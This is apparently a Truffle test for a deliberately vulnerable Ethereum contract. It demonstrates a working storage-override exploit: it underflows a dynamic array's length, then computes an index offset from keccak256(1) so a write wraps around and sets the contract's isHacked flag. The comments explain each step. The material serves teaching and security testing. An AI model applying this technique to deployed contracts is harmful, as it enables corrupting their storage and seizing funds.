var BigNumber = require('bignumber.js');
var ArrayStorageOverride = artifacts.require("./ArrayStorageOverride.sol");

contract("Array storage override test", (accounts) => {

    it("Test override", async () => {

        var victim = await ArrayStorageOverride.new();

        var isHacked = await victim.isHacked.call();
        assert.isFalse(isHacked);
        var size = await victim.size.call();
        assert.equal(0, size);

        var maxNumber = new BigNumber(2).pow(256).minus(1);
        // in a dynamic array, the data pointer is at the keccak256(p) where p is the storage position where it should
        // be if it was a normal type, in this case: 1
        var arrayDataPointer = web3.sha3("0x0000000000000000000000000000000000000000000000000000000000000001", {encoding: 'hex'});
        var arrayDataPointerNumber = new BigNumber(arrayDataPointer)
        // when something is inserted into the array, we want to use this offset, to make the index
        // to overflow and go back to the position 0, so we can point at the storage at 0 and modify it
        var offset = maxNumber.minus(arrayDataPointerNumber).plus(1);
        // we pop an element in the array, the length is 0, to it will decrement and underflow
        await victim.pop();
        var size = await victim.size.call();
        // checking that now the size of the array is 2^256-1 because of the underflow, so we control the whole thing
        assert.isTrue(size.equals(maxNumber));
        // just double checking that the isHacked bool is still not modified
        var isHacked = await victim.isHacked.call();
        assert.isFalse(isHacked);
        // here, since the length of the array is the max number possible with 32 bytes, we can insert at any index.
        // if we insert at index 0, then, the value would be inserted at the storage position keccak256(0x1). So, since
        // we want to modify the position 0, we need to overflow it. Whatever index we enter will be added to the result
        // of keccak256(1), so if we use: ((2^256-1) - keccak256(1)) + 1, we have an overflow and it will put the value
        // at the position 0 of the storage, which is the variable isHacked in the contract.
        await victim.insert("0x" + offset.toString(16), 0x1);
        var isHacked = await victim.isHacked.call();
        // Pwned
        assert.isTrue(isHacked);
    });
});
